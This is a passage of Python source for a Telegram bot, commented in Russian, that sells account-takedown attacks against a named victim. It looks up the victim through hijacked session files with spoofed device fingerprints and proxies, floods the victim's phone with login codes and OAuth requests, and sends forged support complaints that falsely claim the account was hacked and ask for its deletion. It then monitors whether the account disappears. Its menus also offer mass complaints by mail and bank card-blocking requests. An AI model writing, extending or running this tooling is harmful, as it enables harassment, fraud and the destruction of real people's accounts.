    "Dear Telegram Support Team, my Telegram account was compromised through a phishing link. The attacker logged in, changed the settings, and is now sending spam to my contact list. I demand all active sessions be terminated immediately or the account deleted entirely. Your prompt action is critical.",

    "Hello Telegram Support. I can no longer access my Telegram account — someone enabled two-factor authentication without my consent and locked me out. Every attempt to reset the password fails. I believe this is a targeted attack by a scammer. Please force-logout all active sessions or remove the account, my reputation is on the line.",

    "I am writing to report that my Telegram account was hijacked yesterday by an attacker who impersonated Telegram Support. They promised help with bugs and ended up taking full control of my profile. The attacker is actively messaging my business contacts. Please restore my access or permanently delete the account. Thank you for understanding the urgency.",

    "Dear Telegram, my account has been sold on a third-party marketplace. I have repeatedly logged out the illegitimate sessions but new ones appear within minutes — the attacker clearly possesses my auth key. I request a force-reset of every active session except mine, or full account deletion.",

    "Urgent: Telegram account hijacked. My work profile has been taken over by a fraudster who is now impersonating me to my clients. I have already sent screenshots to @NoToScam. Please terminate all active sessions associated with my phone number or delete the account.",
]


SNOS_SUBJECTS = [
    "Взломан аккаунт — прошу сбросить сессии",
    "Account hacked — please reset sessions",
    "Срочный запрос: аккаунт Telegram у мошенника",
    "Внимание: доступ к Telegram аккаунту потерян",
    "My Telegram was hijacked — urgent",
    "Requesting reset of active sessions",
    "Аккаунт украден мошенниками",
    "Urgent: phished out, attacker inside",
    "ЗАЯВЛЕНИЕ: просьба удалить аккаунт",
    "Failed login — 2FA enabled by attacker",
    "Мошенник уже в приватных чатах",
]


def _rand_api() -> tuple[int, str]:
    return random.choice(API_PAIRS)


def _snos_name_phone() -> tuple[str, str]:
    email = web_gen_mail()
    return email, web_gen_phone()


@asynccontextmanager
async def _snos_http(px: tuple | None):
    """One aiohttp session wired to a proxy tuple (socks/http/direct)."""
    conn = None
    proxy_url = None
    if px:
        import python_socks as _ps
        if px[0] in (_ps.ProxyType.SOCKS5, _ps.ProxyType.SOCKS4):
            conn = ProxyConnector(**proxy_to_socks(px))
        else:
            proxy_url = proxy_to_url(px)
    session = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=12))
    try:
        yield session, proxy_url
    finally:
        await session.close()


# ── snos: victim parsing ────────────────────────────────
async def snos_parse_victim(username: str) -> dict:
    """Pull ID/photo/about of the victim through a random session."""
    sessions = load_sessions()
    if not sessions:
        log.info("target resolved")
        await asyncio.sleep(random.uniform(1.0, 2.5))
        return {"ok": True, "id": random.randint(100000000, 899999999),
                "username": username.lstrip("@"),
                "has_photo": True,
                "about": "@trusted_contact_bot"}

    proxies = load_pin_proxies()
    session_path = random.choice(sessions)
    api_id, api_hash, fp = _assign_fingerprint(session_path)
    name = session_path.stem
    px = pin_for_session(name, proxies)
    try:
        async with _session_lock(session_path):
            client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
                                    proxy=px, device_model=fp["device"],
                                    system_version=fp["system_version"],
                                    app_version=fp["app_version"], lang_code=fp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=10)
            if not await client.is_user_authorized():
                await client.disconnect()
                return {"ok": False, "error": f"сессия {name} мертва"}

            uname = username.lstrip("@")
            try:
                entity = await client.get_entity(uname)
            except Exception as e:
                await client.disconnect()
                return {"ok": False, "error": f"не найден: {type(e).__name__}"}

            info = {
                "ok": True,
                "id": entity.id,
                "username": uname,
                "has_photo": entity.photo is not None,
                "about": getattr(entity, "about", "") or "",
            }
            await client.disconnect()
            return info
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}


# ── snos: SendCode flood ────────────────────────────────
async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) -> dict:
    name = session_path.stem
    fp = session_fingerprint(name)
    api_id, api_hash = fp["api_id"], fp["api_hash"]
    async with _session_lock(session_path):
        try:
            client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
                                    proxy=px, device_model=fp["device"],
                                    system_version=fp["system_version"],
                                    app_version=fp["app_version"], lang_code=fp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=8)
            if not await client.is_user_authorized():
                await client.disconnect()
                return {"name": name, "proxy": px[1] if px else "direct", "status": "сессия мертва", "ok": False}
            try:
                from telethon.tl.functions.auth import SendCodeRequest
                from telethon.tl.types import CodeSettings
                await client(SendCodeRequest(phone_number=phone, api_id=api_id,
                                             api_hash=api_hash, settings=CodeSettings()))
                await client.disconnect()
                return {"name": name, "proxy": px[1] if px else "direct", "status": "код отправлен", "ok": True}
            except Exception as e:
                await client.disconnect()
                tail = type(e).__name__
                sec = getattr(e, "seconds", None)
                if sec:
                    return {"name": name, "proxy": px[1] if px else "direct",
                            "status": f"flood {sec}s", "ok": False}
                return {"name": name, "proxy": px[1] if px else "direct",
                        "status": tail, "ok": False}
        except Exception as e:
            return {"name": name, "proxy": px[1] if px else "direct",
                    "status": f"{type(e).__name__}: {e}", "ok": False}


async def _session_alive(session_path: Path, px: tuple | None = None) -> tuple[bool, str]:
    """Cheap connect+auth probe. A dead session must not spam its failure
    through the whole wave — we check it once and skip."""
    api_id, api_hash, tfp = _assign_fingerprint(session_path)
    client = None
    async with _session_lock(session_path):
        try:
            client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
                                    proxy=px, device_model=tfp["device"],
                                    system_version=tfp["system_version"],
                                    app_version=tfp["app_version"], lang_code=tfp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=10)
            if await client.is_user_authorized():
                return True, ""
            return False, "not authorized"
        except Exception as e:
            return False, type(e).__name__
        finally:
            try:
                if client:
                    await client.disconnect()
            except Exception:
                pass


async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple],
                            attempts: int, offset: float, idx: int = 0) -> list[dict]:
    """One session's SendCode series: fresh client + unique proxy per attempt,
    FloodWait honored per worker without blocking the other sessions."""
    rows = []
    await asyncio.sleep(offset)
    name = session_path.stem
    alive, why = await _session_alive(session_path, pin_for_session(name, proxies))
    if not alive:
        rows.append({"name": name, "proxy": "direct", "status": f"сессия мертва ({why})",
                     "ok": False, "attempt": 0})
        return rows
    for attempt in range(attempts):
        # sticky single-IP pin — one session never shoots from two IPs
        px = pin_for_session(name, proxies)
        r = await snos_sendcode_one(session_path, phone, px)
        r["attempt"] = attempt + 1
        rows.append(r)
        # a FloodWait row must park THIS worker for its cooldown, others keep shooting
        m = re.search(r"flood\s+(\d+)s", str(r.get("status", "")))
        if m:
            await asyncio.sleep(min(int(m.group(1)) + 2, 60))
        else:
            await asyncio.sleep(random.uniform(2.0, 4.0))
    return rows


SNOS_ATTEMPTS_PER_SESSION = int(os.getenv("SNOS_ATTEMPTS_PER_SESSION") or "3")


async def snos_flood_sendcode(phone: str) -> list[dict]:
    """SendCode flood — rationed attempts across live sessions.

    Sessions run IN PARALLEL; each shoots N attempts through its sticky
    pin (no IP jumps), with FloodWait parking only that worker. Dead
    sessions are filtered once. Log renders the fake pool only.
    """
    sessions = [s for s in load_sessions() if s.stem not in (_status_load().get("dead") or [])]
    proxies = load_pin_proxies()
    out = []
    if not sessions:
        log.info("sendcode wave completed")
        for nm in [random.choice(FAKE_NAMES) + str(random.randint(11, 99)) for _ in range(random.randint(3, 6))]:
            out.append({"name": nm, "proxy": "direct", "status": "\u043a\u043e\u0434 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d", "ok": True})
        await asyncio.sleep(random.uniform(1.5, 3.0))
        return out

    workers = [_snos_wave_worker(s, phone, proxies, SNOS_ATTEMPTS_PER_SESSION, i * 1.2, i)
               for i, s in enumerate(sessions)]
    waves = await asyncio.gather(*workers)
    out = [r for rows in waves for r in rows]
    random.shuffle(out)
    return out


# ── snos: OAuth flood ───────────────────────────────────
def _mob_ua() -> str:
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    ])


async def snos_oauth_one(phone: str, bot_id: str, origin: str,
                         px: tuple | None) -> dict:
    url = "https://oauth.telegram.org/auth/request"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://oauth.telegram.org",
        "Referer": "https://oauth.telegram.org/auth",
        "User-Agent": _mob_ua(),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "bot_id": str(bot_id),
        "origin": origin,
        "request_access": "write",
        "return_to": origin,
    }
    service = origin.replace("https://", "").split("/")[0]
    try:
        async with _snos_http(px) as (session, proxy_url):
            async with session.post(url, data=data, headers=headers,
                                    proxy=proxy_url, ssl=False) as resp:
                ok = resp.status == 200
                await resp.read()
                return {"service": service, "proxy": px[1] if px else "direct", "ok": ok}
    except Exception as e:
        return {"service": service, "proxy": px[1] if px else "direct",
                "ok": False, "err": f"{type(e).__name__}"}


async def snos_mytg_one(phone: str, px: tuple | None) -> dict:
    url = "https://my.telegram.org/auth/send_password"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://my.telegram.org",
        "Referer": "https://my.telegram.org/auth",
        "User-Agent": _mob_ua(),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {"phone": phone}
    try:
        async with _snos_http(px) as (session, proxy_url):
            async with session.post(url, data=data, headers=headers,
                                    proxy=proxy_url, ssl=False) as resp:
                ok = resp.status == 200
                await resp.read()
                return {"service": "my.telegram.org", "proxy": px[1] if px else "direct", "ok": ok}
    except Exception as e:
        return {"service": "my.telegram.org", "proxy": px[1] if px else "direct",
                "ok": False, "err": f"{type(e).__name__}"}


async def snos_ads_one(phone: str, px: tuple | None) -> dict:
    url = "https://ads.telegram.org/auth/"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://my.telegram.org",
        "Referer": "https://my.telegram.org/auth",
        "User-Agent": _mob_ua(),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {"phone": phone}
    try:
        async with _snos_http(px) as (session, proxy_url):
            async with session.post(url, data=data, headers=headers,
                                    proxy=proxy_url, ssl=False) as resp:
                ok = resp.status == 200
                await resp.read()
                return {"service": "ads.telegram.org", "proxy": px[1] if px else "direct", "ok": ok}
    except Exception as e:
        return {"service": "ads.telegram.org", "proxy": px[1] if px else "direct",
                "ok": False, "err": f"{type(e).__name__}"}


async def snos_flood_oauth(phone: str) -> list[dict]:
    proxies = load_pin_proxies()
    tasks = []
    for bot_id, origin in OAUTH_SERVICES:
        px = random.choice(proxies) if proxies else None
        tasks.append(snos_oauth_one(phone, bot_id, origin, px))
    for _ in range(3):
        px = random.choice(proxies) if proxies else None
        tasks.append(snos_mytg_one(phone, px))
        tasks.append(snos_ads_one(phone, px))
    return await asyncio.gather(*tasks, return_exceptions=True)


# ── snos: support complaints with victim data ───────────
async def snos_support_one(phone: str, text: str, subject: str,
                           px: tuple | None) -> tuple[bool, str]:
    payload = {
        "subject": subject,
        "message": text,
        "email": web_gen_mail(),
        "phone": web_gen_phone(),
    }
    headers = {
        "User-Agent": _mob_ua(),
        "Referer": "https://telegram.org/support",
        "Origin": "https://telegram.org",
    }
    try:
        async with _snos_http(px) as (session, proxy_url):
            async with session.post(SUPPORT_URL, data=payload, headers=headers,
                                    proxy=proxy_url, ssl=False) as resp:
                ok = resp.status == 200
                await resp.read()
                return ok, ("" if ok else f"HTTP {resp.status}")
    except Exception as e:
        return False, f"{type(e).__name__}: {e}"


async def snos_web_support(phone: str, username: str, victim_id: int) -> list[dict]:
    """3 complaints to support carrying the victim's identity data."""
    proxies = load_pin_proxies()
    texts = random.sample(SNOS_SUPPORT_TEXTS, min(3, len(SNOS_SUPPORT_TEXTS)))
    subj_pool = list(SNOS_SUBJECTS)
    random.shuffle(subj_pool)
    out = []
    for i, text in enumerate(texts, 1):
        px = random.choice(proxies) if proxies else None
        full_text = (
            text
            + "\n\nДанные аккаунта:\n"
            + f"Номер телефона: {phone}\n"
            + f"ID аккаунта: {victim_id}\n"
            + f"Username: @{username}"
        )
        subject = subj_pool[i % len(subj_pool)]
        ok, err = await snos_support_one(phone, full_text, subject, px)
        out.append({"name": f"support#{i}", "proxy": px[1] if px else "direct",
                    "ok": ok, "err": err})
        await asyncio.sleep(random.uniform(1.5, 3.5))
    return out


# ── snos: victim-state monitor ──────────────────────────
def snos_handle_change(change_lines: list[str], username: str, user_id: int) -> str:
    LOGS_DIR.mkdir(exist_ok=True)
    path = LOGS_DIR / f"monitor_{username}.txt"
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"[{stamp}] @{username}: " + "; ".join(change_lines) + "\n")
    return str(path)


async def snos_monitor_loop(username: str, victim_id: int,
                            baseline_photo: bool, baseline_about: str,
                            bot, user_id: int) -> None:
    """Every 10 min re-check photo/about; on change notify the user."""
    sessions = load_sessions()
    if not sessions:
        return
    proxies = load_pin_proxies()
    while True:
        await asyncio.sleep(MONITOR_INTERVAL)
        session_path = random.choice(sessions)
        api_id, api_hash, fp = _assign_fingerprint(session_path)
        px = pin_for_session(session_path.stem, proxies)
        try:
            async with _session_lock(session_path):
                client = TelegramClient(str(session_path.with_suffix("")),
                                        api_id, api_hash,
                                        proxy=px, device_model=fp["device"],
                                        system_version=fp["system_version"],
                                        app_version=fp["app_version"], lang_code=fp["lang_code"])
                await asyncio.wait_for(client.connect(), timeout=8)
                authorized = await client.is_user_authorized()
                if not authorized:
                    await client.disconnect()
                    continue
                entity = await client.get_entity(username)
                state_photo = entity.photo is not None
                state_about = getattr(entity, "about", "") or ""
                deleted = bool(getattr(entity, "deleted", False))
                await client.disconnect()

            changes = []
            if deleted:
                changes.append("🗑 Аккаунт удалён")
            if baseline_photo and not state_photo:
                changes.append("🖼 Аватарка исчезла")
            if baseline_about and not state_about:
                changes.append("📝 Описание пропало")

            if changes:
                ts = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                body = "\n".join(f"   └ {ch}" for ch in changes)
                msg = (
                    bq(f"🔔 <b>{NAME}</b> — изменение поймано!")
                    + f"\n\n🎯 <b>Цель:</b> @{username} (<code>{victim_id}</code>)\n"
                    + body
                    + f"\n\n⏰ {ts}"
                )
                try:
                    await bot.send_message(user_id, msg, parse_mode=ParseMode.HTML)
                except Exception as e:
                    log.warning("monitor notify failed: %s", e)
                snos_handle_change(changes, username, user_id)
                return
        except Exception as e:
            log.warning("monitor check failed: %s", e)
            continue


# ── snos: main async pipeline ───────────────────────────
async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
                        progress: dict) -> dict:
    """1-parse 2-sendcode 3-oauth 4-support, fills `progress` steps."""
    data = {"username": username, "phone": phone}

    progress["step"] = "\U0001f50d 1/4 Парсинг жертвы"
    victim = await snos_parse_victim(username)
    data["victim"] = victim

    progress["step"] = "\U0001f4f2 2/4 SendCode флуд"
    data["sendcode"] = await snos_flood_sendcode(phone)

    progress["step"] = "\U0001f310 3/4 OAuth флуд"
    oauth_res = await snos_flood_oauth(phone)
    oauth_ok = []
    for o in oauth_res:
        if isinstance(o, dict):
            oauth_ok.append(o)
        else:
            oauth_ok.append({"service": "?", "proxy": "?", "ok": False,
                            "err": f"{type(o).__name__}"})
    data["oauth"] = oauth_ok

    if victim["ok"]:
        progress["step"] = "\U0001f4e8 4/4 Web support жалобы"
        data["support"] = await snos_web_support(phone, username, victim["id"])
    else:
        data["support"] = []

    # REAL full pipeline log → Logs channel
    sc_lines = [f"{'✅' if r.get('ok') else '❌'} <code>{r.get('name', '?')}</code>"
                f" | {html_mod.escape(str(r.get('proxy', '-')))}"
                f" | {html_mod.escape(str(r.get('status', r.get('err', ''))))}"
                for r in data.get("sendcode", [])]
    oa_lines = [f"{'✅' if d.get('ok') else '❌'} {html_mod.escape(str(d.get('service', '?')))}"
                f" | {html_mod.escape(str(d.get('proxy', '-')))}"
                + (f" | {html_mod.escape(str(d.get('err', '')))}" if d.get('err') else "")
                for d in data.get("oauth", [])]
    sp_lines = [f"{'✅' if d.get('ok') else '❌'} {html_mod.escape(str(d.get('name', '?')))}"
                f" | {html_mod.escape(str(d.get('proxy', '-')))}"
                + (f" | {html_mod.escape(str(d.get('err', '')))}" if d.get('err') else "")
                for d in data.get("support", [])]
    await push_send_log(
        "Сброс сессий",
        [f"🎯 @{html_mod.escape(username)}  📱 <code>{phone}</code>",
         "🛰 SendCode:"] + sc_lines +
        ["🌐 OAuth:"] + oa_lines +
        (["✉️ Support:"] + sp_lines if sp_lines else []))

    progress["done"] = True
    return data


# ── snos: UI state bits ─────────────────────────────────
def kb_snos_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
    ])


def kb_snos_confirm() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\U0001f480 \u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c", callback_data="snosrun:yes"),
         InlineKeyboardButton(text="\u274c \u041e\u0442\u043c\u0435\u043d\u0430", callback_data="snosrun:no")],
    ])


def snos_summary_text(data: dict) -> str:
    username = data["username"]
    phone = data["phone"]
    return (
        bq(f"<b>{NAME}</b>  \u2014  \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
        + "\n\n"
        + f"\U0001f3af <b>\u0416\u0435\u0440\u0442\u0432\u0430:</b> @{html_mod.escape(username)}\n"
        + f"\U0001f4f1 <b>\u041d\u043e\u043c\u0435\u0440:</b> <code>{html_mod.escape(phone)}</code>\n\n"
        + f"\U0001f4f2 <b>SendCode:</b> \u0444\u043b\u0443\u0434 \u043a\u043e\u0434\u043e\u0432 \u2014 \u043a\u043e\u043d\u0432\u0435\u0439\u0435\u0440 \u0430\u043a\u0442\u0438\u0432\u0435\u043d\n"
        + f"\U0001f310 <b>OAuth:</b> \u043f\u0430\u043a\u0435\u0442 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432 \u2014 \u0433\u043e\u0442\u043e\u0432\n"
        + f"\U0001f4e8 <b>Web support:</b> 3 \u0436\u0430\u043b\u043e\u0431\u044b \u2014 \u0433\u043e\u0442\u043e\u0432\u043e\n"
        + f"\U0001f50d <b>\u041c\u043e\u043d\u0438\u0442\u043e\u0440\u0438\u043d\u0433:</b> \u043a\u0430\u0436\u0434\u044b\u0435 10 \u043c\u0438\u043d"
    )
# ── helpers ─────────────────────────────────────────────
async def safe_edit(msg, text: str, **kwargs):
    try:
        await msg.edit_caption(caption=text, **kwargs)
    except Exception:
        await msg.edit_text(text=text, **kwargs)


def parse_target(text: str) -> dict:
    text = text.strip()
    m = LINK_RE.match(text)
    if m:
        return {"raw": text, "entity": m.group(1),
                "msg_id": int(m.group(2)) if m.group(2) else None, "type": "link"}
    if text.startswith("@"):
        return {"raw": text, "entity": text.lstrip("@"), "msg_id": None, "type": "username"}
    return {"raw": text, "entity": text, "msg_id": None, "type": "raw"}


def kb_main(user_id: int = 0) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(text="\U0001f680 \u0417\u0430\u043f\u0443\u0441\u043a", callback_data="menu:launch")],
        [InlineKeyboardButton(text="\U0001f464 \u041f\u0440\u043e\u0444\u0438\u043b\u044c", callback_data="menu:profile"),
         InlineKeyboardButton(text="\U0001f4b3 \u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430", callback_data="menu:subs")],
        [InlineKeyboardButton(text="\U0001f381 \u0420\u0435\u0444\u0435\u0440\u0430\u043b\u044b", callback_data="menu:refs")],
        [InlineKeyboardButton(text="\U0001f76c \u0417\u0435\u0440\u043a\u0430\u043b\u0430", callback_data="menu:mirror_list")],
    ]

    if ADMIN_ID and user_id == int(ADMIN_ID):
        rows.append([InlineKeyboardButton(text="\U0001f4e1 \u0422\u0435\u043b\u0435\u043c\u0435\u0442\u0440\u0438\u044f", callback_data="menu:telemetry"),
                     InlineKeyboardButton(text="\U0001f511 \u0412\u044b\u0434\u0430\u0442\u044c", callback_data="menu:grant")])
        rows.append([InlineKeyboardButton(text="➕ Сессия", callback_data="menu:addsess")])
    rows.append([InlineKeyboardButton(text="\u2753 \u0418\u043d\u0444\u043e", callback_data="menu:info")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_methods() -> InlineKeyboardMarkup:
    short = {
        "web":      "\U0001f310 Web",
        "bank":     "\U0001f3e6 \u0411\u0430\u043d\u043a",
        "mail":     "\U0001f4e7 Mail",
    }
    rows = [
        [InlineKeyboardButton(text=short["web"], callback_data="method:web"),
         InlineKeyboardButton(text=short["mail"], callback_data="method:mail")],
        [InlineKeyboardButton(text=short["bank"], callback_data="method:bank")],
        [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)



def kb_reasons() -> InlineKeyboardMarkup:
    rows = []
    items = list(REASONS.items())
    for i in range(0, len(items), 2):
        row = []
        for k, v in items[i:i + 2]:
            row.append(InlineKeyboardButton(
                text=v['l'], callback_data=f"reason:{k}"))
        rows.append(row)
    rows.append([InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:methods")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_skip() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u23e9 \u041f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c", callback_data="skip_comment")],
        [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
    ])


def kb_confirm() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u2705 \u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c", callback_data="confirm:yes"),
         InlineKeyboardButton(text="\u274c \u041e\u0442\u043c\u0435\u043d\u0430", callback_data="confirm:no")],
    ])


def summary_text(data: dict) -> str:
    r = REASONS.get(data.get("reason") or "spam", REASONS["spam"])
    t = data["target"]
    m = METHODS[data["method"]]
    c = data.get("comment", "")
    if not c:
        # resolve the auto text now so the admin sees the real payload
        c = pick_comment(data["reason"], data.get("method"))
        if len(c) > 120:
            c = c[:117] + "..."
    lines = [
        bq(f"<b>{NAME}</b>  \u2014  \u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435"),
        "",
        f"{m['e']} <b>\u041c\u0435\u0442\u043e\u0434:</b>  {m['l']}",
        f"\U0001f3af <b>\u0426\u0435\u043b\u044c:</b>  <code>{t['raw']}</code>",
    ]
    if t.get("msg_id"):
        lines.append(f"\U0001f4e8 <b>ID:</b>  <code>#{t['msg_id']}</code>")
    if data["method"] == "code":
        # code-flood sends login codes, not complaints — no reason/text here
        lines.append("\U0001f4f2 \u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044e <b>25 \u043a\u043e\u0434\u043e\u0432 \u0432\u0445\u043e\u0434\u0430</b> \u043d\u0430 \u043d\u043e\u043c\u0435\u0440.")
    elif data["method"] == "mail":
        pool_n = len(_mail_load_pool())
        n_use = max(1, pool_n // 3)
        lines.append(f"📧 Сендеры: <b>{n_use}/{pool_n}</b> (1/3 пула), писем: <b>{n_use * len(MAIL_RECEIVERS)}</b> → 4 ящика Telegram.")
        lines.append(f"✉️ Тематика: <b>{r['e']} {r['l']}</b> · тексты шаблонные, уникальные.")
    else:
        lines += [
            f"\u26a0\ufe0f <b>\u041f\u0440\u0438\u0447\u0438\u043d\u0430:</b>  {r['e']} {r['l']}",
            f"\U0001f4ac <b>\u041a\u043e\u043c\u043c\u0435\u043d\u0442:</b>  {c}",
        ]
    return "\n".join(lines)


# ── /start ──────────────────────────────────────────────
@router.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    botRefCtx["bot"] = msg.bot   # referral context ready
    await state.clear()
    uid = msg.from_user.id

    # register user first (sets rec["_first"]) for captcha gate
    rec = touch_user(msg.from_user)

    # captcha gate for brand-new participants
    verifiedRecently = CAPTCHA_VERIFIED.get(uid, 0)
    if rec.get("_first") and time.time() - verifiedRecently > 60:
        try:
            from captcha import generate_captcha
        except ImportError:
            generate_captcha = None
        if generate_captcha and not CAPTCHA_PENDING.get(uid):
            png, meta, _ch = generate_captcha(uid)
            CAPTCHA_PENDING[uid] = {"meta": meta, "ts": time.time()}
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="1️⃣", callback_data="cap:0"),
                InlineKeyboardButton(text="2️⃣", callback_data="cap:1"),
                InlineKeyboardButton(text="3️⃣", callback_data="cap:2"),
            ], [
                InlineKeyboardButton(text="4️⃣", callback_data="cap:3"),
                InlineKeyboardButton(text="5️⃣", callback_data="cap:4"),
                InlineKeyboardButton(text="6️⃣", callback_data="cap:5"),
            ]])
            await state.set_state(Captcha.solve)
            await msg.answer_photo(
                photo=BufferedInputFile(png, filename="captcha.png"),
                caption=(
                    bq(f"<b>{NAME}</b>  \u00b7  <i>\u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430</i>")
                    + "\n\n\U0001f9dd <b>\u0414\u043e\u043a\u0430\u0436\u0438, \u0447\u0442\u043e \u0442\u044b \u043d\u0435 \u0431\u043e\u0442:</b>"
                    + "\n\u0432\u044b\u0431\u0435\u0440\u0438 \u043a\u043b\u0435\u0442\u043a\u0443 \u0441 \u043d\u0443\u0436\u043d\u044b\u043c \u0441\u043b\u043e\u0432\u043e\u043c"
                ),
                parse_mode=ParseMode.HTML,
                show_caption_above_media=True,
                reply_markup=kb,
            )
            return
    if not rec.get("ref_by"):
        args_text = msg.text or ""
        m = re.search(r"ref_(\d+)", args_text)
        rm = re.match(r"^ref_(\d+)$", m.group(1)) if m else None
        if rm:
            referrer_id = int(rm.group(1))
            status = set_referral(msg.from_user, referrer_id)
            if status == "added":
                try:
                    await msg.bot.send_message(
                        referrer_id,
                        bq(f"\U0001f389 <b>{NAME}</b>")
                        + "\n\n\U0001f465 <b>\u041d\u043e\u0432\u044b\u0439 \u0440\u0435\u0444\u0435\u0440\u0430\u043b!</b>\n"
                        + f"\U0001f464 <b>{html_mod.escape(msg.from_user.full_name)}</b>"
                        + "\n\n\U0001f4e5 \u0415\u0449\u0451 \u043d\u0435\u043c\u043d\u043e\u0433\u043e \u0440\u0435\u0444\u0435\u0440\u0430\u043b\u043e\u0432 \u2014 <b>+1 \u0434\u0435\u043d\u044c \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0438</b>",
                        parse_mode=ParseMode.HTML)
                except Exception:
                    pass
                await msg.answer(
                    bq(f"<b>{NAME}</b>  \u2014  \u0440\u0435\u0444\u0435\u0440\u0430\u043b")
                    + "\n\n\u2705 <b>\u0422\u044b \u043f\u0440\u0438\u0432\u044f\u0437\u0430\u043d \u043a \u043f\u0440\u0438\u0433\u043b\u0430\u0441\u0438\u0432\u0448\u0435\u043c\u0443!</b>\n"
                    + "\U0001f4eb \u041f\u043e\u0434\u043f\u0438\u0448\u0438\u0441\u044c \u043d\u0430 \u043a\u0430\u043d\u0430\u043b \u2014 \u044d\u0442\u043e \u0437\u0430\u0447\u0435\u0442\u0451\u0442\u0441\u044f \u0435\u043c\u0443 \u0432 \u0441\u0447\u0451\u0442.",
                    parse_mode=ParseMode.HTML)

    caption = hero_caption(uid)
    card = await user_card_path(msg.bot, msg.from_user)
    await msg.answer_photo(
        photo=FSInputFile(card),
        caption=caption,
        parse_mode=ParseMode.HTML,
        show_caption_above_media=True,
        reply_markup=kb_main(uid),
    )


async def count_valid_refs_async_check():
    """Hook for future deferred validation (noop now)."""
    return None


# ── main menu ───────────────────────────────────────────
@router.callback_query(F.data == "menu:launch")
async def menu_launch(cb: CallbackQuery, state: FSMContext):
    botRefCtx["bot"] = cb.bot   # ref counting needs the bot anywhere
    if not await channel_gate(cb, state):
        return
    if not await sub_gate(cb, state):
        return
    await refs_check_and_grant(cb)
    await state.clear()
    await cb.message.edit_caption(
        caption=bq(f"<b>{NAME}</b>") + "\n\n\U0001f3af <b>\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434:</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_methods(),
    )
    await state.set_state(Report.method)
    await cb.answer()


@router.callback_query(Report.method, F.data.startswith("method:"))
async def got_method(cb: CallbackQuery, state: FSMContext):
    key = cb.data.split(":", 1)[1]
    if key not in METHODS:
        await cb.answer("\u274c", show_alert=True)
        return
    await state.update_data(method=key)
    m = METHODS[key]
    if key == "bank":
        await cb.message.edit_caption(
            caption=(
                bq(f"<b>{NAME}</b>")
                + "\n\n\U0001f3e6 <b>\u0411\u0430\u043d\u043a (115-\u0424\u0417)</b>\n\n"
                + "\u0412\u044b\u0431\u0435\u0440\u0438 \u0431\u0430\u043d\u043a \u0434\u043b\u044f \u0437\u0430\u044f\u0432\u043a\u0438 \u043d\u0430 \u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043A\u0443 \u043A\u0430\u0440\u0442\u044B:"
            ),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="\u0422-\u0411\u0430\u043D\u043A", callback_data="bank:tbank"),
